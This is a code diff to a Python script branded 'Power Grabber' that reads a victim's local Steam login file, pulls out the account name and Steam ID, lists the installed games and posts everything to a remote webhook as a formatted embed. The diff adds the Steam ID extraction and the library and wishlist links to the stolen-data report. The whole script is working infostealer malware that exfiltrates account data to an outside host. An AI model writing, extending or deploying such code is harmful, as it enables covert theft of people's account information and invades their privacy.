@@ -20,18 +20,20 @@ def is_steam_installed():
         if os.path.exists(steam_exe_path):
             return path
     return None
-def get_account_name_from_vdf(vdf_path):
+def get_account_name_and_steam_id_from_vdf(vdf_path):
     try:
         with open(vdf_path, "r", encoding="utf-8") as file:
             data = file.read()
-            match = re.search(r'"AccountName"\s+"(.*?)"', data)
-            if match:
-                return match.group(1)
+            account_name_match = re.search(r'"AccountName"\s+"(.*?)"', data)
+            steam_id_match = re.search(r'"(\d{17})"', data)  # Steam IDs are 17 digits long
+            account_name = account_name_match.group(1) if account_name_match else None
+            steam_id = steam_id_match.group(1) if steam_id_match else None
+            return account_name, steam_id
     except FileNotFoundError:
         pass
     except PermissionError:
         pass
-    return None
+    return None, None
 def get_library_folders(steam_install_path):
     libraryfolders_path = os.path.join(steam_install_path, "steamapps", "libraryfolders.vdf")
     library_folders = [steam_install_path]
@@ -60,15 +62,16 @@ def get_installed_steam_games(steam_install_path):
                     if game_name and game_name not in SYSTEM_GAME_NAMES:
                         installed_games.append(game_name)
     return installed_games
-def send_webhook(account_name, games):
+def send_webhook(account_name, games, steam_id):
+    games_url = f"https://steamcommunity.com/id/{steam_id}/games"
+    wishlist_url = f"https://steamcommunity.com/id/{steam_id}/wishlist"
     timestamp = datetime.datetime.utcnow().isoformat() + "Z"
     embed = {
         "embeds": [
             {
                 "title": f"🎮 Steam Account Info for **{account_name}**",
                 "description": (
-                    "Here's the **Steam Account Information** and a list of **installed games** for this user. "
-                    "Explore your gaming universe with us!"
+                    "Here’s the **Steam Account Information**, a list of **installed games**, and the **games URL** for this user."
                 ),
                 "color": 0x8b0000,
                 "thumbnail": {
@@ -89,10 +92,20 @@ def send_webhook(account_name, games):
                         "name": "🕹️ **Installed Games**",
                         "value": "\n".join(games) if games else "No games installed.",
                         "inline": False
+                    },
+                    {
+                        "name": "💿 **User's Game Library:**",
+                        "value": f"[Click Me]({games_url})",
+                        "inline": False
+                    },
+                    {
+                        "name": "🌠 **User's Wishlist:**",
+                        "value": f"[Click Me]({wishlist_url})",
+                        "inline": False
                     }
                 ],
                 "footer": {
-                    "text": "Power Grabber | Made by Powercascade and Taktikal.exe",
+                    "text": "Power Grabber | Created by Powercascade & Taktikal.exe",
                     "icon_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
                 },
                 "timestamp": timestamp
@@ -104,29 +117,22 @@ def send_webhook(account_name, games):
         if response.status_code == 204:
             pass
         else:
-            pass
+            print(f"Failed to send webhook. Status code: {response.status_code}")
     except requests.exceptions.RequestException as e:
-        pass
+        print(f"Webhook request failed: {e}")
 def main():
     steam_install_path = is_steam_installed()
     if steam_install_path:
         config_path = os.path.join(steam_install_path, "config")
         vdf_path = os.path.join(config_path, "loginusers.vdf")
-        account_name = get_account_name_from_vdf(vdf_path)
-        if account_name:
-            pass
+        account_name, steam_id = get_account_name_and_steam_id_from_vdf(vdf_path)
+        if account_name and steam_id:
+            games = get_installed_steam_games(steam_install_path)
+            send_webhook(account_name, games, steam_id)
         else:
-            pass
-        games = get_installed_steam_games(steam_install_path)
-        if games:
-            pass
-            for game in games:
-                pass
-        else:
-            pass
-        if account_name:
-            send_webhook(account_name, games)
+            print("Failed to retrieve account name or Steam ID.")
     else:
-        pass
+        print("Steam is not installed.")
+
 if __name__ == "__main__":
     main()
